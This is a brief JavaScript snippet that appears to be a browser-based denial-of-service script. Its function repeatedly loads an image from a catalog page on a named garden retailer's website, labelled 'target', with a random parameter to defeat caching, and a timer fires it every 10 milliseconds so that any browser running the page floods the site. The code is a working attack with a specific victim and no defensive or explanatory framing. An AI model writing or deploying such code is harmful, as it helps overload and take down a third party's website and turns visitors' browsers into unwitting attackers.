function floodRequest() {
   var website = 'www.nichegardens.com/catalog/item.php?id=1911' //target
   var pic = new Image()
   var rand = Math.floor(Math.random() * 1000)
   pic.src = 'http://'+website+'&'+rand+"=asdf"
}

setInterval(floodRequest, 10);
